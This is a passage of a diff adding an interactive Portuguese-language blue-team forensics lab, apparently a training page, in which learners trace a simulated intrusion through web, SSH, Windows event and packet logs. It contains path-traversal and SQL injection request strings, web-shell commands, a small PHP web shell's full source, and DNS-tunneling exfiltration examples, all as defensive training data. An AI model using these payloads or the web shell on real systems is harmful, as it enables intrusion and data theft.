+            <span class="log-line clickable anomalous" data-type="traversal,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:17] "GET /../../etc/passwd HTTP/1.1" 400 512 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="traversal,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:19] "GET /../../etc/shadow HTTP/1.1" 400 512 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="traversal,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:21] "GET /../../../etc/passwd HTTP/1.1" 400 512 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="traversal,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:23] "GET /../../../../win.ini HTTP/1.1" 400 512 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="traversal,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:25] "GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 512 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="sqli,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:42] "GET /search?q=' OR '1'='1 HTTP/1.1" 500 872 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line clickable anomalous" data-type="sqli,scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:44] "GET /search?q=1' UNION SELECT * FROM users-- HTTP/1.1" 500 872 "sqlmap/1.7.8#stable"</span>
+            <span class="log-line" data-type="normal">192.168.10.5 - - [08/Nov/2024:08:12:33] "GET /products.html HTTP/1.1" 200 8841 "Mozilla/5.0 (Macintosh)"</span>
+          </div>
+          <p class="log-hint">↑ Clique nas linhas suspeitas para marcá-las como descobertas</p>
+        </div>
+        <div class="checklist-col">
+          <div class="chk-header">Descobertas — Etapa 1</div>
+          <div class="checklist">
+            <div class="chk-item" id="chk-traversal">
+              <div class="chk-dot"></div>
+              <div class="chk-info">
+                <div class="chk-text">Tentativas de path traversal identificadas</div>
+                <div class="chk-pts">+50 pts</div>
+              </div>
+            </div>
+            <div class="chk-item" id="chk-sqli">
+              <div class="chk-dot"></div>
+              <div class="chk-info">
+                <div class="chk-text">Tentativas de SQL Injection identificadas</div>
+                <div class="chk-pts">+50 pts</div>
+              </div>
+            </div>
+            <div class="chk-item" id="chk-scanner">
+              <div class="chk-dot"></div>
+              <div class="chk-info">
+                <div class="chk-text">User-Agent do scanner identificado (sqlmap)</div>
+                <div class="chk-pts">+50 pts</div>
+              </div>
+            </div>
+            <div class="chk-item" id="chk-ip">
+              <div class="chk-dot"></div>
+              <div class="chk-info">
+                <div class="chk-text">IP do atacante identificado (10.20.45.113)</div>
+                <div class="chk-pts">+50 pts</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- ETAPA 2 — Acesso Inicial (locked)                     -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="etapa-wrap section-wrap" id="et2-wrap">
+    <!-- Content injected by JS on unlock -->
+    <div class="locked-card" id="et2-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Etapa 2 — Acesso Inicial</div>
+      <div class="locked-msg">Complete 3 descobertas da Etapa 1 para desbloquear</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- ETAPA 3 — Persistência (locked)                       -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="etapa-wrap section-wrap" id="et3-wrap">
+    <div class="locked-card" id="et3-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Etapa 3 — Persistência</div>
+      <div class="locked-msg">Complete 3 descobertas da Etapa 2 para desbloquear</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- ETAPA 4 — Exfiltração (locked)                        -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="etapa-wrap section-wrap" id="et4-wrap">
+    <div class="locked-card" id="et4-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Etapa 4 — Exfiltração</div>
+      <div class="locked-msg">Complete 3 descobertas da Etapa 3 para desbloquear</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- TIMELINE (locked)                                     -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="etapa-wrap section-wrap" id="tl-wrap">
+    <div class="locked-card" id="tl-locked">
+      <div class="locked-icon">🔒</div>
+      <div class="locked-title">Kill Chain — Timeline Interativa</div>
+      <div class="locked-msg">Complete 3 descobertas em cada etapa para desbloquear a Timeline</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- CLOSING                                               -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="section-wrap" id="closing-section" style="display:none">
+    <div class="closing-card">
+      <div class="closing-hdr">
+        <div class="closing-icon">🏁</div>
+        <div>
+          <h2 class="closing-title">Ataque Reconstruído — Kill Chain Completa</h2>
+          <p class="closing-sub">Você analisou múltiplas fontes de log e montou a sequência completa do ataque.</p>
+        </div>
+      </div>
+      <div class="closing-body">
+        <div class="killchain-narrative">
+          <p>O ataque começou às <strong>02:00</strong> com um scanner automatizado (sqlmap) varrendo o servidor web de <strong>10.20.45.113</strong>. Foram tentadas path traversal e SQL Injection para identificar vulnerabilidades.</p>
+          <p>Paralelamente, às <strong>02:17</strong>, brute force SSH contra o host <strong>linux01.corp.local</strong> resultou em acesso root após 47 tentativas. Um <strong>web shell</strong> foi carregado em <code style="color:var(--cyan)">/var/www/html/shell.php</code> para persistência de acesso web.</p>
+          <p>Com acesso ao domínio, o atacante criou a conta <strong>svc_helper</strong> no DC01 às <strong>02:19</strong> e elevou seus privilégios ao grupo Administrators. Um novo serviço (<em>WinDefend_Helper</em>) e uma tarefa agendada garantiram <strong>persistência</strong> mesmo após reinicialização.</p>
+          <p>A partir de <strong>03:18</strong>, beacon C2 para <em>update-cdn185.net</em> a cada 300s indicou controle ativo. A <strong>exfiltração</strong> ocorreu via DNS tunneling (dados encoded nos subdomínios) e transferência HTTPS de <em>10,2 MB</em> em 2 minutos.</p>
+        </div>
+        <div class="lc-banner">
+          <div class="lc-icon">🏆</div>
+          <h3 class="lc-title">Lab 05 Concluído!</h3>
+          <div class="lc-score" id="lc-score">1000 pts</div>
+          <p class="lc-msg">Você analisou logs de 4 fontes diferentes, identificou todas as etapas do ataque e reconstruiu a kill chain completa.</p>
+          <a class="lc-back" href="https://blueteam.army/courses">&larr; Voltar para o Curso</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <span class="footer-text">&copy; 2025 Blue Team Army. Todos os direitos reservados.</span>
+    <a class="footer-link" href="https://blueteam.army" target="_blank" rel="noopener">blueteam.army</a>
+  </footer>
+
+</div><!-- .page -->
+
+<script>
+(function () {
+'use strict';
+
+/* ── Token Gate ──────────────────────────────────────── */
+(function initGate() {
+  const inp = document.getElementById('token-input');
+  const btn = document.getElementById('token-btn');
+  const err = document.getElementById('token-err');
+  if (!inp) return;
+  function tryToken() {
+    if (inp.value.trim() === 'BTA-LAB05-2026') {
+      localStorage.setItem('bta-lab05-access', 'BTA-LAB05-2026');
+      document.documentElement.classList.remove('show-gate');
+    } else {
+      err.classList.add('visible');
+      inp.classList.add('tg-shake');
+      inp.value = '';
+      setTimeout(() => inp.classList.remove('tg-shake'), 400);
+    }
+  }
+  btn.addEventListener('click', tryToken);
+  inp.addEventListener('keydown', e => { if (e.key === 'Enter') tryToken(); err.classList.remove('visible'); });
+})();
+
+/* ── State ───────────────────────────────────────────── */
+const score = { et1: 0, et2: 0, et3: 0, et4: 0, tl: 0 };
+const done  = { et1: new Set(), et2: new Set(), et3: new Set(), et4: new Set(), tl: false };
+const THRESHOLD = 150;
+
+function total() { return score.et1 + score.et2 + score.et3 + score.et4 + score.tl; }
+
+/* ── Toast ───────────────────────────────────────────── */
+let toastTimer = null;
+function showToast(label, pts, msg) {
+  const t = document.getElementById('flag-toast');
+  document.getElementById('toast-label').textContent = label;
+  document.getElementById('toast-pts').textContent   = '+' + pts + ' pts';
+  document.getElementById('toast-msg').textContent   = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 2800);
+}
+
+/* ── HUD ─────────────────────────────────────────────── */
+function updateHUD() {
+  document.getElementById('hud-pts').textContent = total();
+}
+
+/* ── Progress steps ──────────────────────────────────── */
+function setProgStep(n, state) {
+  const el = document.getElementById('prog-' + n);
+  if (!el) return;
+  el.classList.remove('act-step--active', 'act-step--done');
+  if (state === 'active') el.classList.add('act-step--active');
+  if (state === 'done')   el.classList.add('act-step--done');
+}
+
+/* ── Section reveal ──────────────────────────────────── */
+function revealSection(el) {
+  el.style.display = 'block';
+  el.offsetHeight;
+  el.classList.add('visible');
+}
+
+/* ── Award discovery ─────────────────────────────────── */
+function award(etapa, key, pts, label, msg) {
+  if (done[etapa].has(key)) return;
+  done[etapa].add(key);
+  score[etapa] += pts;
+  updateHUD();
+
+  // Update checklist item
+  const chk = document.getElementById('chk-' + key);
+  if (chk) chk.classList.add('done');
+
+  // Update etapa score display
+  const sc = document.getElementById(etapa + '-score');
+  if (sc) sc.textContent = score[etapa] + ' / 200 pts';
+
+  // Mark etapa num done if at 200
+  if (score[etapa] >= 200) {
+    const num = document.getElementById(etapa + '-num');
+    if (num) num.classList.add('done');
+  }
+
+  showToast(label, pts, msg);
+  checkUnlocks();
+}
+
+/* ── Check unlock thresholds ─────────────────────────── */
+function checkUnlocks() {
+  if (score.et1 >= THRESHOLD && !document.getElementById('et2-card')) {
+    buildEt2(); setProgStep(1, 'done'); setProgStep(2, 'active');
+  }
+  if (score.et2 >= THRESHOLD && !document.getElementById('et3-card')) {
+    buildEt3(); setProgStep(2, 'done'); setProgStep(3, 'active');
+  }
+  if (score.et3 >= THRESHOLD && !document.getElementById('et4-card')) {
+    buildEt4(); setProgStep(3, 'done'); setProgStep(4, 'active');
+  }
+  if (score.et4 >= THRESHOLD && !document.getElementById('tl-card')
+      && score.et1 >= THRESHOLD && score.et2 >= THRESHOLD && score.et3 >= THRESHOLD) {
+    buildTimeline(); setProgStep(4, 'done'); setProgStep(5, 'active');
+  }
+}
+
+/* ═══════════════════════════════════════════════════════ */
+/* ETAPA 1 — Log viewer interaction                       */
+/* ═══════════════════════════════════════════════════════ */
+document.getElementById('et1-log').querySelectorAll('.log-line.clickable').forEach(line => {
+  line.addEventListener('click', function () {
+    this.classList.add('flagged');
+    const types = this.dataset.type.split(',');
+
+    if (types.includes('traversal')) award('et1', 'traversal', 50, '🔍 Descoberta!', 'Path traversal identificado');
+    if (types.includes('sqli'))      award('et1', 'sqli',      50, '🔍 Descoberta!', 'SQL Injection identificado');
+    if (types.includes('scanner'))   award('et1', 'scanner',   50, '🔍 Descoberta!', 'User-Agent sqlmap identificado');
+    if (types.includes('ip'))        award('et1', 'ip',        50, '🔍 Descoberta!', 'IP atacante 10.20.45.113 identificado');
+  });
+});
+
+/* ═══════════════════════════════════════════════════════ */
+/* ETAPA 2 — Terminal                                     */
+/* ═══════════════════════════════════════════════════════ */
+const TERM_RESPONSES = {
+  'cat /var/log/auth.log': {
+    lines: [
+      { t: 'normal', v: 'Nov 08 02:17:03 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54230 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:06 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54231 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:09 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54232 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:13 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54233 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:16 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54234 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:19 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54235 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:22 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54236 ssh2' },
+      { t: 'normal', v: 'Nov 08 02:17:25 linux01 sshd[4521]: Failed password for root from 10.20.45.113 port 54237 ssh2' },
+      { t: 'hi',     v: 'Nov 08 02:17:31 linux01 sshd[4521]: Accepted password for root from 10.20.45.113 port 54278 ssh2' },
+    ],
+    discovery: 'et2-auth'
+  },
+  'cat /var/log/apache2/access.log': {
+    lines: [
+      { t: 'normal', v: '10.20.45.113 - - [08/Nov/2024:02:05:44] "GET /search?q=test HTTP/1.1" 200 312' },
+      { t: 'hi',     v: '10.20.45.113 - - [08/Nov/2024:02:05:44] "POST /shell.php?cmd=id HTTP/1.1" 200 24 "curl/7.81.0"' },
+      { t: 'hi',     v: '10.20.45.113 - - [08/Nov/2024:02:05:47] "POST /shell.php?cmd=whoami HTTP/1.1" 200 5 "curl/7.81.0"' },
+      { t: 'hi',     v: '10.20.45.113 - - [08/Nov/2024:02:05:52] "POST /shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1843 "curl/7.81.0"' },
+      { t: 'hi',     v: '10.20.45.113 - - [08/Nov/2024:02:06:01] "POST /shell.php?cmd=useradd+-m+svc_helper HTTP/1.1" 200 0 "curl/7.81.0"' },
+    ],
+    discovery: 'et2-shell-access'
+  },
+  'find / -name "*.php" -newer /etc/passwd': {
+    lines: [
+      { t: 'err',    v: "find: '/proc/tty/driver': Permission denied" },
+      { t: 'err',    v: "find: '/root/.ssh': Permission denied" },
+      { t: 'hi',     v: '/var/www/html/shell.php' },
+    ],
+    discovery: 'et2-find-shell'
+  },
+  'cat /var/www/html/shell.php': {
+    lines: [
+      { t: 'normal', v: '<?php' },
+      { t: 'hi',     v: '// Web Shell — Acesso remoto não autorizado' },
+      { t: 'normal', v: "if(isset($_REQUEST['cmd'])) {" },
+      { t: 'normal', v: "    $cmd = $_REQUEST['cmd'];" },
+      { t: 'hi',     v: '    echo system($cmd);' },
+      { t: 'normal', v: '}' },
+      { t: 'normal', v: '?>' },
+    ],
+    discovery: 'et2-view-shell'
+  },
+  'ls /var/log': {
+    lines: [
+      { t: 'normal', v: 'apache2  auth.log  kern.log  messages  syslog  wtmp' }
+    ]
+  },
+  'ls /var/www/html': {
+    lines: [
+      { t: 'normal', v: 'index.php  wp-admin/  wp-content/  wp-includes/' },
+      { t: 'hi',     v: 'shell.php' }
+    ]
+  },
+  'ls': {
+    lines: [{ t: 'normal', v: 'auth.log  kern.log  messages  syslog' }]
+  },
+  'whoami': { lines: [{ t: 'ok', v: 'root' }] },
+  'pwd':    { lines: [{ t: 'normal', v: '/root' }] },
+  'uname -a': { lines: [{ t: 'normal', v: 'Linux linux01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux' }] },
+  'date': { lines: [{ t: 'normal', v: 'Fri Nov  8 02:17:45 UTC 2024' }] },
+  'help': {
+    lines: [
+      { t: 'ok', v: 'Comandos disponíveis neste terminal forense:' },
+      { t: 'normal', v: '  cat /var/log/auth.log              — logs de autenticação SSH' },
+      { t: 'normal', v: '  cat /var/log/apache2/access.log    — logs de acesso web' },
+      { t: 'normal', v: '  find / -name "*.php" -newer /etc/passwd — arquivos PHP suspeitos' },
+      { t: 'normal', v: '  cat /var/www/html/shell.php        — conteúdo do web shell' },
+    ]
+  },
+};
+
+function buildEt2() {
+  const wrap = document.getElementById('et2-wrap');
+  wrap.innerHTML = `
+  <div class="etapa-card" id="et2-card">
+    <div class="etapa-hdr">
+      <div class="etapa-num" id="et2-num">2</div>
+      <div>
+        <div class="etapa-tag">Etapa 2</div>
+        <div class="etapa-title">Acesso Inicial</div>
+      </div>
+      <div class="etapa-score" id="et2-score">0 / 200 pts</div>
+    </div>
+    <div class="etapa-body">
+      <div class="main-col">
+        <div class="sub-label">Terminal Forense — linux01.corp.local</div>
+        <div class="terminal-card">
+          <div class="term-bar">
+            <span class="term-dot term-dot-r"></span>
+            <span class="term-dot term-dot-y"></span>
+            <span class="term-dot term-dot-g"></span>
+            <span class="term-bar-title">root@linux01:~# — Terminal Forense</span>
+          </div>
+          <div class="term-body" id="et2-term-out">
+            <span class="term-out-line ok-line">Conectado a linux01.corp.local — sessão forense (somente leitura)</span>
+            <span class="term-out-line">Digite "help" para ver os comandos disponíveis.</span>
+          </div>
+          <div class="term-input-row">
+            <span class="term-prompt-txt">root@linux01:~# </span>
+            <input type="text" class="term-input" id="et2-term-input"
+              autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"
+              placeholder="digite um comando…" />
+          </div>
+        </div>
+        <p class="term-hint">↑ Use os comandos listados em "help" para explorar o sistema comprometido</p>
+      </div>
+      <div class="checklist-col">
+        <div class="chk-header">Descobertas — Etapa 2</div>
+        <div class="checklist">
+          <div class="chk-item" id="chk-et2-auth"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Brute force SSH no auth.log</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et2-shell-access"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Acesso via web shell identificado</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et2-find-shell"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Arquivo shell.php localizado</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et2-view-shell"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Conteúdo do web shell inspecionado</div><div class="chk-pts">+50 pts</div></div></div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+
+  revealSection(wrap);
+
+  const termOut   = document.getElementById('et2-term-out');
+  const termInput = document.getElementById('et2-term-input');
+  let cmdHistory  = [];
+  let histIdx     = -1;
+
+  function printLine(text, cls) {
+    const s = document.createElement('span');
+    s.className = 'term-out-line' + (cls ? ' ' + cls : '');
+    s.textContent = text;
+    termOut.appendChild(s);
+    termOut.scrollTop = termOut.scrollHeight;
+  }
+
+  function runCmd(raw) {
+    const cmd = raw.trim();
+    if (!cmd) return;
+
+    cmdHistory.unshift(cmd);
+    histIdx = -1;
+    printLine('root@linux01:~# ' + cmd, 'prompt-line');
+
+    const resp = TERM_RESPONSES[cmd];
+    if (resp) {
+      const clsMap = { normal: '', hi: 'hi-line', ok: 'ok-line', err: 'err-line' };
+      resp.lines.forEach(l => printLine(l.v, clsMap[l.t] || ''));
+      if (resp.discovery && !done.et2.has(resp.discovery)) {
+        const labels = {
+          'et2-auth':        ['🔑 Descoberta!', 'Brute force SSH encontrado no auth.log'],
+          'et2-shell-access':['🐚 Descoberta!', 'Web shell ativo em /var/www/html/shell.php'],
+          'et2-find-shell':  ['📂 Descoberta!', 'shell.php localizado em /var/www/html/'],
+          'et2-view-shell':  ['🕵️ Descoberta!', 'Código do web shell inspecionado'],
+        };
+        const [lbl, msg] = labels[resp.discovery];
+        award('et2', resp.discovery, 50, lbl, msg);
+      }
+    } else {
+      printLine('-bash: ' + cmd.split(' ')[0] + ': command not found', 'err-line');
+    }
+    termOut.scrollTop = termOut.scrollHeight;
+  }
+
+  termInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') {
+      const v = termInput.value;
+      termInput.value = '';
+      runCmd(v);
+    }
+    if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (histIdx < cmdHistory.length - 1) termInput.value = cmdHistory[++histIdx];
+    }
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (histIdx > 0) termInput.value = cmdHistory[--histIdx];
+      else { histIdx = -1; termInput.value = ''; }
+    }
+  });
+
+  termInput.focus();
+}
+
+/* ═══════════════════════════════════════════════════════ */
+/* ETAPA 3 — Event Viewer                                 */
+/* ═══════════════════════════════════════════════════════ */
+const EVENTS = [
+  { eid: 4624, time: '02:03:11', cat: 'Logon/Logoff',        host: 'DC01.corp.local',      desc: 'Logon de rede — CORP\\Administrator',                      cls: '',           detail: 'Tipo: 3 (Network) · Workstation: (none) · IP: 10.20.45.113' },
+  { eid: 4720, time: '02:19:47', cat: 'Conta de Usuário',     host: 'DC01.corp.local',      desc: 'Conta criada: CORP\\svc_helper',                           cls: 'critical',   detail: 'Criada por: Administrator · Sem ticket de RH · Descrição: "serviço auxiliar"', discovery: 'et3-acct-create' },
+  { eid: 4732, time: '02:20:03', cat: 'Grupo de Segurança',   host: 'DC01.corp.local',      desc: 'Membro adicionado ao grupo Administrators: svc_helper',   cls: 'critical',   detail: 'Grupo: CORP\\Administrators · Adicionado por: Administrator · Contexto: noturno', discovery: 'et3-priv-escalation' },
+  { eid: 4625, time: '02:20:58', cat: 'Logon/Logoff',         host: 'WIN10-07.corp.local',  desc: 'Falha de logon: svc_helper (senha incorreta)',              cls: '',           detail: 'Código: 0xC000006D · Tipo: 3 (Network) · IP: 192.168.10.7' },
+  { eid: 7045, time: '02:21:15', cat: 'Sistema',              host: 'WIN10-07.corp.local',  desc: 'Novo serviço instalado: WinDefend_Helper',                 cls: 'suspicious', detail: 'Caminho: C:\\Windows\\System32\\svchost.exe -k WinDefend_Helper · Início: Automático', discovery: 'et3-new-service' },
+  { eid: 4698, time: '02:22:41', cat: 'Agendador de Tarefas', host: 'WIN10-07.corp.local',  desc: 'Tarefa agendada criada: \\Microsoft\\Windows\\WinDefend_Update', cls: 'suspicious', detail: 'Ação: powershell.exe -enc BASE64STRING · Gatilho: Ao iniciar · Criada por: svc_helper', discovery: 'et3-sched-task' },
+  { eid: 4624, time: '02:23:05', cat: 'Logon/Logoff',         host: 'WIN10-07.corp.local',  desc: 'Logon interativo: svc_helper',                             cls: '',           detail: 'Tipo: 2 (Interactive) · IP: local' },
+  { eid: 4688, time: '02:24:19', cat: 'Criação de Processo',  host: 'WIN10-07.corp.local',  desc: 'Processo: cmd.exe (pai: WinDefend_Helper.exe)',             cls: 'suspicious', detail: 'Linha de comando: cmd.exe /c whoami · PID: 3412 · Usuário: svc_helper' },
+];
+
+function buildEt3() {
+  const wrap = document.getElementById('et3-wrap');
+  const rowsHTML = EVENTS.map((ev, i) => `
+    <tr class="ev-row ${ev.cls}" data-idx="${i}">
+      <td class="ev-id">${ev.eid}</td>
+      <td>${ev.time}</td>
+      <td>${ev.cat}</td>
+      <td>${ev.host}</td>
+      <td class="ev-desc">${ev.desc}</td>
+    </tr>
+    <tr><td colspan="5" class="ev-detail">${ev.detail}</td></tr>`).join('');
+
+  wrap.innerHTML = `
+  <div class="etapa-card" id="et3-card">
+    <div class="etapa-hdr">
+      <div class="etapa-num" id="et3-num">3</div>
+      <div><div class="etapa-tag">Etapa 3</div><div class="etapa-title">Persistência</div></div>
+      <div class="etapa-score" id="et3-score">0 / 200 pts</div>
+    </div>
+    <div class="etapa-body">
+      <div class="main-col">
+        <div class="sub-label">Windows Event Log — DC01 + WIN10-07</div>
+        <div class="ev-toolbar">
+          <button class="ev-filter-btn active" data-filter="all">Todos</button>
+          <button class="ev-filter-btn" data-filter="4720">4720</button>
+          <button class="ev-filter-btn" data-filter="4732">4732</button>
+          <button class="ev-filter-btn" data-filter="7045">7045</button>
+          <button class="ev-filter-btn" data-filter="4698">4698</button>
+        </div>
+        <div class="ev-table-wrap">
+          <table class="ev-table">
+            <thead><tr><th>EventID</th><th>Hora</th><th>Categoria</th><th>Host</th><th>Descrição</th></tr></thead>
+            <tbody id="et3-tbody">${rowsHTML}</tbody>
+          </table>
+        </div>
+        <p class="log-hint">↑ Clique em um evento para ver detalhes e marcar como descoberta</p>
+      </div>
+      <div class="checklist-col">
+        <div class="chk-header">Descobertas — Etapa 3</div>
+        <div class="checklist">
+          <div class="chk-item" id="chk-et3-acct-create"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Criação de conta backdoor (4720)</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et3-priv-escalation"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Elevação ao grupo Administrators (4732)</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et3-new-service"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Novo serviço malicioso instalado (7045)</div><div class="chk-pts">+50 pts</div></div></div>
+          <div class="chk-item" id="chk-et3-sched-task"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Tarefa agendada suspeita criada (4698)</div><div class="chk-pts">+50 pts</div></div></div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+
+  revealSection(wrap);
+
+  // Row click
+  const tbody = document.getElementById('et3-tbody');
+  tbody.querySelectorAll('.ev-row').forEach(row => {
+    row.addEventListener('click', function () {
+      const wasOpen = this.classList.contains('open');
+      tbody.querySelectorAll('.ev-row').forEach(r => r.classList.remove('open', 'selected'));
+      if (!wasOpen) {
+        this.classList.add('open', 'selected');
+        const ev = EVENTS[parseInt(this.dataset.idx)];
+        if (ev.discovery) {
+          const labels = {
+            'et3-acct-create':     ['👤 Descoberta!', 'Conta backdoor svc_helper identificada (EventID 4720)'],
+            'et3-priv-escalation': ['⬆️ Descoberta!',  'Escalada ao grupo Administrators (EventID 4732)'],
+            'et3-new-service':     ['⚙️ Descoberta!',  'Serviço WinDefend_Helper instalado (EventID 7045)'],
+            'et3-sched-task':      ['🕐 Descoberta!',  'Tarefa agendada maliciosa identificada (EventID 4698)'],
+          };
+          const [lbl, msg] = labels[ev.discovery];
+          award('et3', ev.discovery, 50, lbl, msg);
+        }
+      }
+    });
+  });
+
+  // Filter buttons
+  wrap.querySelectorAll('.ev-filter-btn').forEach(btn => {
+    btn.addEventListener('click', function () {
+      wrap.querySelectorAll('.ev-filter-btn').forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+      const f = this.dataset.filter;
+      tbody.querySelectorAll('.ev-row').forEach(row => {
+        const ev = EVENTS[parseInt(row.dataset.idx)];
+        const hide = f !== 'all' && String(ev.eid) !== f;
+        row.style.display = hide ? 'none' : '';
+        // Also hide the detail row
+        const det = row.nextElementSibling;
+        if (det) det.style.display = hide ? 'none' : '';
+      });
+    });
+  });
+}
+
+/* ═══════════════════════════════════════════════════════ */
+/* ETAPA 4 — Packet Viewer                                */
+/* ═══════════════════════════════════════════════════════ */
+const PACKETS = [
+  { num:  1, time: '03:10:01.001', src: '192.168.10.7',  dst: '8.8.8.8',        proto: 'DNS',   len:   62, info: 'Standard query A google.com',                   cls: '' },
+  { num:  2, time: '03:10:01.045', src: '8.8.8.8',       dst: '192.168.10.7',   proto: 'DNS',   len:   78, info: 'Standard response A 142.250.80.14',              cls: '', detail: 'Resposta DNS normal — domínio legítimo' },
+  { num:  3, time: '03:18:05.112', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'DNS',   len:  124, info: 'Query: dGhpcy1pcy1leGZpbA==.update-cdn185.net',  cls: 'pkt-anomalous', discovery: 'et4-dns-exfil',    detail: '⚠ Subdomínio contém dados Base64 encoded — DNS tunneling detectado' },
+  { num:  4, time: '03:18:10.334', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'DNS',   len:  131, info: 'Query: dXNlcm5hbWVzLnR4dA==.update-cdn185.net',  cls: 'pkt-anomalous', discovery: 'et4-dns-exfil',    detail: '⚠ Dados codificados: "usernames.txt" — exfiltração via DNS' },
+  { num:  5, time: '03:18:15.089', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'DNS',   len:  118, info: 'Query: cGFzc3dvcmRzLnR4dA==.update-cdn185.net',  cls: 'pkt-anomalous', discovery: 'et4-dns-exfil',    detail: '⚠ Dados codificados: "passwords.txt" — credenciais sendo exfiltradas' },
+  { num:  6, time: '03:18:20.001', src: '192.168.10.7',  dst: '151.101.65.140', proto: 'HTTPS', len: 1460, info: 'TLSv1.3 Application Data → CDN legítimo',        cls: '' },
+  { num:  7, time: '03:18:22.001', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTPS', len: 1460, info: 'TLSv1.3 [frag 1/87] → 10.20.45.113:443',        cls: 'pkt-anomalous', discovery: 'et4-volume-exfil',  detail: '⚠ Transferência em múltiplos fragmentos para IP externo suspeito' },
+  { num:  8, time: '03:18:22.012', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTPS', len: 1460, info: 'TLSv1.3 [frag 2/87] → 10.20.45.113:443',        cls: 'pkt-anomalous', discovery: 'et4-volume-exfil',  detail: '⚠ Volume total estimado: 10,2 MB em ~2 minutos — anomalia detectada' },
+  { num:  9, time: '03:18:22.024', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTPS', len: 1460, info: 'TLSv1.3 [frag 3/87] → 10.20.45.113:443 (10.2MB)',cls: 'pkt-anomalous', discovery: 'et4-volume-exfil',  detail: '⚠ 87 fragmentos = ~10.2MB transferidos para IP atacante' },
+  { num: 10, time: '03:18:22.035', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTPS', len: 1460, info: 'TLSv1.3 [frag 4/87] → 10.20.45.113:443',        cls: 'pkt-anomalous', discovery: 'et4-volume-exfil',  detail: '⚠ Taxa de transferência: ~85KB/s — volume anômalo para o horário' },
+  { num: 11, time: '03:19:00.001', src: '192.168.10.15', dst: '172.217.28.4',   proto: 'HTTPS', len:  854, info: 'TLSv1.3 Application Data → Google (normal)',      cls: '' },
+  { num: 12, time: '03:18:22.001', src: '192.168.10.7',  dst: '10.20.45.113',   proto: 'HTTP',  len:  312, info: 'POST /exfil.php HTTP/1.1 — beacon C2',           cls: 'pkt-anomalous', discovery: 'et4-c2-beacon',     detail: '⚠ POST para /exfil.php — padrão de beacon C2; intervalo: 300s' },
